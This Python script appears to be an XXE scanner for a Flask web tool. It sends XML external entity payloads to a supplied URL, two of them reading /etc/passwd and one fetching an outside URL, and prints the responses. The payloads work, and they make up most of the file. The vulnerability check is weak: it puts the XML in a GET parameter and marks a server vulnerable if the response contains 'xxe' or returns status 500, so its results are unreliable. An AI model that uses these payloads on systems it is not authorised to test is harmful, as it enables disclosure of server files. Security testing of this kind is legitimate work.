import requests

# Define XXE payloads
XXE_PAYLOADS = [
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [ 
         <!ELEMENT foo ANY >
         <!ENTITY xxe SYSTEM "file:///etc/passwd" >
       ]>
       <foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [ 
         <!ELEMENT foo ANY >
         <!ENTITY xxe SYSTEM "http://example.com" >
       ]>
       <foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ 
            <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
        ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>'''
]

def detect_xxe(url, session_cookie=None):
    results = []
    headers = {
        'Content-Type': 'application/xml',
    }

    if session_cookie:
        headers['Cookie'] = session_cookie

    for payload in XXE_PAYLOADS:
        try:
            response = requests.get(url, params={'xml': payload}, headers=headers)
            vulnerable = 'xxe' in response.text.lower() or response.status_code == 500
            results.append({
                'payload': payload,
                'status_code': response.status_code,
                'response_content': response.text[:500],  # Truncate for brevity
                'vulnerable': vulnerable
            })
        except requests.RequestException as e:
            results.append({
                'payload': payload,
                'error': str(e)
            })

    # Format the results for Flask
    result_strings = []
    for result in results:
        if 'error' in result:
            result_strings.append(f"Request failed for payload: {result['payload']}\nError: {result['error']}")
        else:
            result_strings.append(f"Payload sent:\n{result['payload']}\nResponse Status Code: {result['status_code']}\nResponse Content: {result['response_content']}\nVulnerable: {'Yes' if result['vulnerable'] else 'No'}")

    return "\n".join(result_strings)
